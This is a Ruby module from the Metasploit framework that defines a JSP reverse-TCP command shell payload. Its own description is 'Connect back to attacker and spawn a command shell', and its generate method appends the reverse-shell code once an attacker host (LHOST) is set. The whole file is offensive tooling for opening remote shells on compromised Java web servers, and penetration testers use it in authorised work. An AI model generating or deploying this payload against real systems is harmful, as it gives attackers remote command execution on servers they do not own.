# frozen_string_literal: true
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/jsp'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule
  CachedSize = 1501

  include Msf::Payload::Single
  include Msf::Payload::JSP
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
                     'Name'          => 'Java JSP Command Shell, Reverse TCP Inline',
                     'Description'   => 'Connect back to attacker and spawn a command shell',
                     'Author'        => [ 'sf' ],
                     'License'       => MSF_LICENSE,
                     'Platform'      => %w(linux osx solaris unix win),
                     'Arch'          => ARCH_JAVA,
                     'Handler'       => Msf::Handler::ReverseTcp,
                     'Session'       => Msf::Sessions::CommandShell,
                     'Payload'       =>
                       {
                         'Offsets' => {},
                         'Payload' => ''
                       }))
  end

  def generate
    return super if !datastore['LHOST'] || datastore['LHOST'].empty?

    super + jsp_reverse_tcp
  end
end
